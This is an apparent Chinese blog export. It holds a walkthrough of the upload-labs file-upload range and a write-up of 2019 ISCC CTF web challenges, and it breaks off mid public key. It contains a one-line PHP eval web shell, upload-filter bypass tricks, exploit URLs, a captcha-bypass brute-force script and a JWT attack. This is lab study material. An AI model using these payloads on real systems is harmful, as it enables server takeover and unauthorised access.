{"meta":{"title":"chuddy's Blog","subtitle":"keep hungry keep foolish","description":null,"author":"chuddy","url":"http://yoursite.com","root":"/"},"pages":[],"posts":[{"title":"文件上传靶场练习","slug":"文件上传靶场练习","date":"2019-05-28T12:21:57.000Z","updated":"2019-06-04T13:09:57.094Z","comments":true,"path":"2019/05/28/文件上传靶场练习/","link":"","permalink":"http://yoursite.com/2019/05/28/文件上传靶场练习/","excerpt":"","text":"title: 文件上传漏洞date: 2019-05-28 20:21:57 tags: web漏洞文件上传漏洞前言文件上传漏洞是一个高危漏洞，想要复习一下，二刷一下文件上传靶场 Pass-01提示： 本pass在客户端使用js对不合法图片进行检查！ 通过提示发现是在客户端用js进行验证的，js验证实在发送到服务器端之前而验证的，那么我们就可以在此之前做点手脚。 可以先上传一个合法的文件，通过抓包来进行修改参数，就可以绕过这个限制了。 Pass-02提示 本pass在服务端对数据包的MIME进行检查！ 源码为： $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { if (($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/jpeg&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/png&#39;) || ($_FILES[&#39;upload_file&#39;][&#39;type&#39;] == &#39;image/gif&#39;)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload = true; } } else { $msg = &#39;文件类型不正确，请重新上传！&#39;; } } else { $msg = UPLOAD_PATH.&#39;文件夹不存在,请手工创建！&#39;; } } 在http数据包中，判断文件类型的是Content-Type字段的值 同样抓包，修改Content-Type为image/jpeg 就可以绕过判断 Pass-03提示： 本pass禁止上传.asp|.aspx|.php|.jsp后缀文件！ 通过提示可以看出，应该是不完善的黑名单所导致的漏洞。 使用不存在于黑名单但是可执行的后缀即可 常见的可执行文件的后缀： PHP: php2、php3、php5、phtml、pht ASP: aspx、ascx、ashx、cer、asa JSP: jspx 注意：想要让服务器将你的文件解析为php，还需要将要修改httpd.conf：（把前面的#去掉） AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .php2 Pass-04提示： 本pass禁止上传.php|.php5|.php4|.php3|.php2|php1|.html|.htm|.phtml|.pHp|.pHp5|.pHp4|.pHp3|.pHp2|pHp1|.Html|.Htm|.pHtml|.jsp|.jspa|.jspx|.jsw|.jsv|.jspf|.jtml|.jSp|.jSpx|.jSpa|.jSw|.jSv|.jSpf|.jHtml|.asp|.aspx|.asa|.asax|.ascx|.ashx|.asmx|.cer|.aSp|.aSpx|.aSa|.aSax|.aScx|.aShx|.aSmx|.cEr|.sWf|.swf后缀文件！ $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;php1&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;pHp1&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //收尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $is_upload = true; } } else { $msg = &#39;此文件不允许上传!&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这个黑名单就比较完善了，过滤了各种罕见后缀，但是没有过滤.htaccess 我们在.htaccess文件上写： SetHandler application/x-httpd-php 意思就是把本目录下的jpeg文件当做php来解析 新建一个jpg文件，内容如下： &lt;?php @eval($_GET[&#39;chuddy&#39;]); ?&gt; 然后访问上传文件的存储位置，可以发现能够被解析为php文件。 Pass-05$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这个黑名单比前面的关卡更加完善了。过滤了.htaccess，但是代码中后缀转换为小写被去掉了，因此我们可以上传Php来绕过黑名单后缀。(在Linux没有特殊配置的情况下，这种情况只有win可以，因为win会忽略大小写) Pass-06查看提示发现同样是黑名店限制，几乎涵盖了所有危险的后缀，那么查看源码 $is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } win下的小技巧：Win下xx.jpg[空格] 或xx.jpg.这两类文件都是不允许存在的，若这样命名，windows会默认除去空格或点 此处会删除末尾的点，但是没有去掉末尾的空格，因此上传一个.php空格文件即可绕过。 Pass-07$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 此处会删除末尾的空格，但是没有去掉末尾的点，因此上传一个.php.文件即可绕过。 Pass-08$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 发现缺少::$DATA 查阅资料发现，这是利用windows操作系统的一个特性： NTFS文件系统包括对备用数据流的支持。这不是众所周知的功能，主要包括提供与Macintosh文件系统中的文件的兼容性。备用数据流允许文件包含多个数据流。每个文件至少有一个数据流。在Windows中，此默认数据流称为：$ DATA。上传.php::$DATA绕过。(仅限windows) Pass-09is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, &#39;.&#39;); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace(&#39;::$DATA&#39;, &#39;&#39;, $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) { if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $_FILES[&#39;upload_file&#39;][&#39;name&#39;])) { $img_path = UPLOAD_PATH . &#39;/&#39; . $file_name; $is_upload = true; } } else { $msg = &#39;此文件不允许上传&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 通过阅读源码，我们可以发现,用户上传的文件名，我们可控。且会删除文件名末尾的点和空格 结合上面几关的解题经验，我们可以发现可以通过创建文件.php.空格.来进行绕过 Pass-10$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#39;upload_file&#39;][&#39;name&#39;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], UPLOAD_PATH . &#39;/&#39; . $file_name)) { $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; $is_upload = true; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 通过查看源码发现 $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); 将黑名单的文件名替换成空，所以我们想到可以通过双写来进行绕过。 Pass-11$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_ext = substr($_FILES[&#39;upload_file&#39;][&#39;name&#39;],strrpos($_FILES[&#39;upload_file&#39;][&#39;name&#39;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr)){ $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $img_path = $_GET[&#39;save_path&#39;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path)){ $is_upload = true; } else{ $msg = &#39;上传失败！&#39;; } } else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; } } 影响版本：5.4.x&lt;= 5.4.39, 5.5.x&lt;= 5.5.23, 5.6.x &lt;= 5.6.7exp：move_uploaded_file($_FILES[&#39;name&#39;][&#39;tmp_name&#39;],&quot;/file.php\\x00.jpg&quot;); 源码中move_uploaded_file中的save_path可控，因此00截断即可。 Pass-12方法同上，只是请求方式改为POST Pass-13提示 本pass检查图标内容开头2个字节！ 我们可以伪造一下文件头的信息 常用文件头： （1） .JPEG;.JPE;.JPG，”JPGGraphic File” （2） .gif，”GIF 89A” （3） .zip，”Zip Compressed” （4） .doc;.xls;.xlt;.ppt;.apr，”MS Compound Document v1 or Lotus Approach APRfile” Pass-14本关可以通过制作图片马进行绕过 制作图片马的方法： 在Windows的cmd中执行命令： copy 图片名/b+ 木马文件/a 合成的图片马名 Pass-15同14关 Pass-16主要是二次渲染绕过 jpg和png很麻烦，gif只需要找到渲染前后没有变化的位置,然后将php代码写进去,就可以了。 二次渲染的详解 Pass-17$is_upload = false; $msg = null; if(isset($_POST[&#39;submit&#39;])){ $ext_arr = array(&#39;jpg&#39;,&#39;png&#39;,&#39;gif&#39;); $file_name = $_FILES[&#39;upload_file&#39;][&#39;name&#39;]; $temp_file = $_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]; $file_ext = substr($file_name,strrpos($file_name,&quot;.&quot;)+1); $upload_file = UPLOAD_PATH . &#39;/&#39; . $file_name; if(move_uploaded_file($temp_file, $upload_file)){ if(in_array($file_ext,$ext_arr)){ $img_path = UPLOAD_PATH . &#39;/&#39;. rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; rename($upload_file, $img_path); $is_upload = true; }else{ $msg = &quot;只允许上传.jpg|.png|.gif类型文件！&quot;; unlink($upload_file); } }else{ $msg = &#39;上传失败！&#39;; } } 可以看到文件先经过保存，然后判断后缀名是否在白名单中，如果不在则删除，此时可以利用条件竞争在保存文件后删除文件前来执行php文件。 一边用bp一直上传木马文件，一边用脚本一直访问该临时文件，就能成功执行命令。 Pass-18原理同17一样，都是利用条件竞争 Pass-19$is_upload = false; $msg = null; if (isset($_POST[&#39;submit&#39;])) { if (file_exists(UPLOAD_PATH)) { $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = $_POST[&#39;save_name&#39;]; $file_ext = pathinfo($file_name,PATHINFO_EXTENSION); if(!in_array($file_ext,$deny_ext)) { $img_path = UPLOAD_PATH . &#39;/&#39; .$file_name; if (move_uploaded_file($_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;], $img_path)) { $is_upload = true; }else{ $msg = &#39;上传失败！&#39;; } }else{ $msg = &#39;禁止保存为该类型文件！&#39;; } } else { $msg = UPLOAD_PATH . &#39;文件夹不存在,请手工创建！&#39;; } } 这里需要注意的是move_uploaded_file会忽略掉文件末尾的/.这里是用户可控的。所以我们可以伪造这样的上传 总结感觉这个图总结的特别详细。 自己还是很菜，还要继续努力呀！","categories":[],"tags":[{"name":"web漏洞","slug":"web漏洞","permalink":"http://yoursite.com/tags/web漏洞/"}]},{"title":"2019ISCC wp","slug":"2019ISCC-wp","date":"2019-05-27T11:55:01.000Z","updated":"2019-05-29T12:42:23.268Z","comments":true,"path":"2019/05/27/2019ISCC-wp/","link":"","permalink":"http://yoursite.com/2019/05/27/2019ISCC-wp/","excerpt":"ISCC 2019 web前言这一段做了iscc的比赛题目，在此记录一下","text":"ISCC 2019 web前言这一段做了iscc的比赛题目，在此记录一下 webweb4地址：http://39.100.83.188:8066/打开题目：发现直接显示源码，于是审计一波： &lt;?php error_reporting(0); include(&quot;flag.php&quot;); $hashed_key = &#39;ddbafb4eb89e218701472d3f6c087fdf7119dfdd560f9d1fcbe7482b0feea05a&#39;; $parsed = parse_url($_SERVER[&#39;REQUEST_URI&#39;]); if(isset($parsed[&quot;query&quot;])){ $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[&#39;action&#39;]; } if($action===&quot;auth&quot;){ $key = $_GET[&quot;key&quot;]; $hashed_input = hash(&#39;sha256&#39;, $key); if($hashed_input!==$hashed_key){ die(&quot;&lt;img src=&#39;cxk.jpg&#39;&gt;&quot;); } echo $flag; } }else{ show_source(__FILE__); }?&gt; 代码审计一波：发现了当传入的参数中 action 为auth，并且key和hashed_key 相等时，就给出 flag。 但是通过关键代码的分析 发现了存在变量覆盖的可能 $parsed = parse_url($_SERVER[&#39;REQUEST_URI&#39;]); if(isset($parsed[&quot;query&quot;])){ $query = $parsed[&quot;query&quot;]; $parsed_query = parse_str($query); if($parsed_query!=NULL){ $action = $parsed_query[&#39;action&#39;]; } 函数parse_url和函数parse_str的配合使用可以实现变量覆盖 parse_url函数 parse_str函数作用 我们可以覆盖$hashed_key的值,为我们所控制的， &lt;?php $hashed_input = hash(&#39;sha256&#39;, &#39;chuddy&#39;); echo $hashed_input; ?&gt; 输出为：2b2714f1209077f1dc46756d01efd7610469b75c74182b5aa0126d50baaef96e 于是构建payload： http://39.100.83.188:8066/?action=auth&amp;hashed_key=2b2714f1209077f1dc46756d01efd7610469b75c74182b5aa0126d50baaef96e&amp;key=chuddy 就可以得到flag web2打开题目： 感觉像是暴力破解但是因为存在验证码，所以需要想办法绕过验证码的限制。 查看源码发现，该题目是通过php来写的验证码页面，猜测验证码的正确值可能会存在session当中。如果我们把session值删除，那么存在里面的验证码也就不存在了，再将传递的user_code的值设置为空就可以绕过验证码， 脚本： #coding=utf-8 import requests import sys reload(sys) sys.setdefaultencoding(&quot;utf8&quot;) data = { &#39;Cookie&#39;: &#39;&#39; } url=&#39;http://39.100.83.188:8002/login.php&#39; for x in xrange(0,10): for a in xrange(0,10): for i in xrange(0,10): data={ &#39;username&#39;:&#39;admin&#39;, &#39;pwd&#39;: str(x)+str(a)+str(i), &#39;user_code&#39;:&#39;&#39;, &#39;submit&#39;:&#39;submit&#39; } res=requests.post(url,data=data) print str(x)+str(a)+str(i) if &quot;å¯ç éè¯¯&quot; not in res.text: print str(x)+str(a)+str(i) print res.text break 得到flag 以及密码996 web1打开题目： &lt;?php error_reporting(0); require &#39;flag.php&#39;; $value = $_GET[&#39;value&#39;]; $password = $_GET[&#39;password&#39;]; $username = &#39;&#39;; for ($i = 0; $i &lt; count($value); ++$i) { if ($value[$i] &gt; 32 &amp;&amp; $value[$i] &lt; 127) unset($value); else $username .= chr($value[$i]); if ($username == &#39;w3lc0me_To_ISCC2019&#39; &amp;&amp; intval($password) &lt; 2333 &amp;&amp; intval($password + 1) &gt; 2333) { echo &#39;Hello &#39;.$username.&#39;!&#39;, &#39;&lt;br&gt;&#39;, PHP_EOL; echo $flag, &#39;&lt;hr&gt;&#39;; } } highlight_file(__FILE__); 代码审计一下：从get传参获取两个变量值value和password value为一个数组，其中里面只能为数组 如果在32和127之间就会被unset处理，其他的会转字符串存入用户名中，然后判断用户名是否为 w3lc0me_To_ISCC2019，再判断用 intval 之后的 password 是否小于 2333， intval 之后的 password + 1 是否大于 2333。 php的chr函数会对传入的值和256取模，于是我们可以传递一个比原来大256的数来进行绕过 可以写个脚本生成payload： stra = &#39;w3lc0me_To_ISCC2019&#39; j=0 value = [] for i in stra: value.append(ord(i)+256) str1 = &quot;&quot; for i in range(len(value)): str1 += &quot;value[&quot;+str(i)+&quot;]=&quot;+str(value[i])+&quot;&amp;&quot; print str1 value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313 至于password参数可以对其进行16进制编码绕过或者科学记数法绕过。 最终payload为： http://39.100.83.188:8001/?value[0]=375&amp;value[1]=307&amp;value[2]=364&amp;value[3]=355&amp;value[4]=304&amp;value[5]=365&amp;value[6]=357&amp;value[7]=351&amp;value[8]=340&amp;value[9]=367&amp;value[10]=351&amp;value[11]=329&amp;value[12]=339&amp;value[13]=323&amp;value[14]=323&amp;value[15]=306&amp;value[16]=304&amp;value[17]=305&amp;value[18]=313&amp;password=1e9 即可得到flag。 web3sqli-labs上的一个原题利用到了二次注入。 打开页面发现需要注册账号进行登陆：于是随便注册一个账号登陆进去发现存在修改密码的功能，于是想到了二次注入。 注册一个用户名为admin&#39;--的账号登陆之后更改密码后台的sql语句可能为：update users set password=’1234561 where username=’admin’– ‘ 就可以修改管理员的账号密码了，进行登陆管理员的账号就得到了flag web6这是一道原题 参考了一叶飘零大佬写的文章文章地址 打开页面登陆进去，没什么思路，于是抓包看了一下： 发现了jwt的代码 eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJuYW1lIjoiY2h1ZGR5IiwicHJpdiI6Im90aGVyIn0.VbwW1bhJ4555jrZw4PJeo1_h3QVQ3M0pUCeSkhu4Y6Z5JL8sSgVBL2Z6EeNDMBWBHy_Ps1WNPVeW1grFE4oH6n3dl7Qh8qsvFbqM3FMmNUwSaQhbjycLMVgHHwq2BbRG0qZoX9G8Fyr-uSLfxK9N18vOcKMirHpju0-qpVOR5gU 于是尝试解码： 通过查看源代码 发现/static/js/common.js后面有一段代码 function getpubkey(){ /* get the pubkey for test /pubkey/{md5(username+password)} */ } 尝试构造一个访问，查了我的用户名加密码的MD5值为：68c623464e8a37ddeb9632fb3ccbe82f 访问 /pubkey/68c623464e8a37ddeb9632fb3ccbe82f发现： 内容为： -----BEGIN PUBLIC 